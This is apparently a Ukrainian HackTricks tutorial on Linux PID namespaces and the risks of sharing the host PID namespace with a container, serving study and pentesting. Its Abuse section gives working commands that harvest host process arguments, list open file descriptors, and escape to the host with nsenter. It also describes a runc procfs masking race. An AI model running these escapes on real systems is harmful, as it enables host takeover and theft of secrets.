# Простір імен PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен PID контролює, як процеси нумеруються і які процеси видимі. Саме тому контейнер може мати свій власний PID 1, навіть якщо це не реальна машина. Всередині простору імен робоче навантаження бачить те, що виглядає як локальне дерево процесів. Зовні простору імен хост все ще бачить реальні хостові PID та повну картину процесів.

З точки зору безпеки, простір імен PID важливий тому, що видимість процесів має цінність. Якщо робоче навантаження може бачити процеси хоста, воно може спостерігати імена сервісів, аргументи командного рядка, секрети, передані в аргументах процесів, стан, отриманий із середовища через `/proc`, та потенційні цілі для входу в інші простори імен. Якщо воно може робити більше, ніж просто бачити ці процеси — наприклад відправляти сигнали або використовувати ptrace за відповідних умов — проблема стає значно серйознішою.

## Принцип роботи

Новий простір імен PID починається зі своєї внутрішньої нумерації процесів. Перший процес, створений всередині нього, стає PID 1 з точки зору цього простору імен, що також означає, що він отримує особливі семантики, подібні до init, для сирітських дочірніх процесів і поведінки зі сигналами. Це пояснює багато дивностей контейнерів навколо init-процесів, збирання zombie-процесів і чому іноді в контейнерах використовують невеликі init-обгортки.

Важливий урок безпеки: процес може виглядати ізольованим, бо бачить лише своє власне дерево PID, але цю ізоляцію можна навмисно зняти. Docker відкриває це через `--pid=host`, а Kubernetes робить це через `hostPID: true`. Як тільки контейнер приєднується до простору імен PID хоста, робоче навантаження бачить процеси хоста напряму, і багато подальших шляхів атаки стають значно реалістичнішими.

## Лабораторне завдання

Щоб створити простір імен PID вручну:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Тепер shell бачить приватний перегляд процесів. Прапорець `--mount-proc` важливий, оскільки він монтує екземпляр procfs, який відповідає новому PID namespace, роблячи список процесів узгодженим зсередини.

Щоб порівняти поведінку container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Різниця очевидна й легко зрозуміла, тож це добре перше лабораторне завдання для читачів.

## Runtime Usage

Звичайні контейнери в Docker, Podman, containerd та CRI-O отримують власний PID namespace. Kubernetes Pods зазвичай також отримують ізольований перегляд PID, якщо тільки робоче навантаження явно не запитує host PID sharing. Середовища LXC/Incus базуються на тому ж примітиві ядра, хоча випадки використання system-container можуть відкривати більш складні дерева процесів і сприяти застосуванню спрощень при налагодженні.

Те саме правило діє скрізь: якщо runtime вирішив не ізолювати PID namespace, це свідоме звуження меж контейнера.

## Misconfigurations

Канонічною неправильною конфігурацією є host PID sharing. Команди часто виправдовують це налагодженням, моніторингом або зручністю управління сервісами, але це завжди слід розглядати як значне порушення безпеки. Навіть якщо контейнер не має негайного write primitive щодо процесів хоста, сама видимість може розкрити багато інформації про систему. Як тільки додаються можливості на кшталт `CAP_SYS_PTRACE` або корисний доступ до procfs, ризик значно зростає.

Інша помилка — припускати, що оскільки робоче навантаження за замовчуванням не може вбивати або ptrace процеси хоста, host PID sharing тому безпечний. Цей висновок ігнорує цінність enumeration, наявність namespace-entry targets і те, як видимість PID поєднується з іншими ослабленими контролями.

## Abuse

Якщо host PID namespace спільний, нападник може інспектувати процеси хоста, збирати аргументи процесів, ідентифікувати цікаві сервіси, знаходити кандидатів на PIDs для `nsenter`, або поєднувати видимість процесів із ptrace-пов'язаними привілеями, щоб заважати хосту або сусіднім workloads. У деяких випадках достатньо просто побачити потрібний довго запущений процес, щоб переформувати решту плану атаки.

Перший практичний крок завжди — підтвердити, що процеси хоста дійсно видимі:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Як тільки host PIDs стають видимими, аргументи процесів і цілі namespace-entry часто стають найкориснішим джерелом інформації:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Якщо `nsenter` доступний і є достатні привілеї, перевірте, чи можна використовувати видимий процес хоста як міст простору імен:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Навіть коли доступ заблоковано, спільне використання PID хоста вже є цінним, оскільки воно розкриває розташування сервісів, runtime-компоненти та потенційні привілейовані процеси для наступної націленої атаки.

Видимість PID хоста також робить зловживання файловими дескрипторами більш реалістичним. Якщо привілейований процес хоста або сусіднє робоче навантаження має відкритий чутливий файл чи сокет, нападник може переглянути `/proc/<pid>/fd/` і повторно використати цей дескриптор залежно від власності, опцій монтування procfs та моделі цільового сервісу.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ці команди корисні, оскільки вони відповідають на питання, чи зменшує `hidepid=1` або `hidepid=2` видимість між процесами та чи видимі очевидно цікаві дескриптори, такі як відкриті секретні файли, logs або Unix sockets.

### Повний приклад: host PID + `nsenter`

Спільне використання host PID стає прямим host escape, коли процес також має достатні привілеї для приєднання до host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Якщо команда виконається успішно, процес container тепер виконується в host mount, UTS, network, IPC та PID namespaces. Наслідок — негайне host compromise.

Навіть коли сам `nsenter` відсутній, той самий результат може бути досягнутий через host binary, якщо host filesystem змонтовано:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Останні зауваження під час виконання

Деякі атаки, релевантні для PID-namespace, не є традиційними misconfigurations `hostPID: true`, а скоріше помилками реалізації під час виконання щодо того, як застосовуються захисти procfs під час налаштування контейнера.

#### `maskedPaths` гонка до procfs хоста

У вразливих версіях `runc`, атакувальники, які могли контролювати образ контейнера або навантаження `runc exec`, могли змагатися на фазі маскування, замінюючи контейнерну `/dev/null` символічним посиланням на чутливий шлях procfs, наприклад `/proc/sys/kernel/core_pattern`. Якщо гонка вдавалася, bind mount замаскованого шляху міг опинитися на неправильній цілі і відкрити глобальні для хоста параметри procfs новому контейнеру.

Корисна команда для перевірки:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Це важливо, оскільки кінцевий вплив може бути таким самим, як при прямому доступі до procfs: можливість запису в `core_pattern` або `sysrq-trigger`, що може призвести до виконання коду на хості або denial of service.

#### Namespace injection with `insject`

Інструменти Namespace injection, такі як `insject`, демонструють, що взаємодія з PID-namespace не завжди вимагає попереднього входу в цільовий namespace перед створенням процесу. Допоміжний процес може приєднатися пізніше, викликати `setns()` та виконуватися зі збереженою видимістю в цільовому PID-просторі:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Цей тип техніки має значення головним чином для розширеного налагодження, offensive tooling та post-exploitation workflows, коли потрібно приєднати контекст простору імен після того, як середовище виконання вже ініціалізувало робоче навантаження.

### Related FD Abuse Patterns

Два патерни варто явно відзначити, коли видні PID'и хоста. По-перше, привілейований процес може залишити чутливий файловий дескриптор відкритим через `execve()`, оскільки він не був позначений `O_CLOEXEC`. По-друге, сервіси можуть передавати файлові дескриптори через Unix-сокети за допомогою `SCM_RIGHTS`. В обох випадках цікавим об'єктом уже не є шлях (pathname), а вже відкритий handle, який процес з нижчими привілеями може успадкувати або отримати.

Це важливо при роботі з контейнерами, оскільки дескриптор може вказувати на `docker.sock`, привілейований лог, секретний файл хоста або інший цінний об'єкт навіть коли сам шлях недоступний з файлової системи контейнера.

## Checks

Метою цих команд є визначити, чи має процес приватний перегляд PID-ів, чи він вже може перерахувати значно ширший ландшафт процесів.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Що тут цікаво:

- Якщо список процесів містить очевидні сервісі хоста, ймовірно вже діє спільне використання PID хоста.
- Нормою є бачити лише невелике локальне для контейнера дерево процесів; бачити `systemd`, `dockerd` або непов’язані демони — ні.
- Як тільки PID хоста стають видимими, навіть інформація про процеси лише для читання стає корисною для розвідки.

Якщо ви виявите контейнер, що працює зі спільним використанням PID хоста, не сприймайте це як косметичну відмінність. Це суттєва зміна в тому, що робоче навантаження може спостерігати і потенційно впливати.
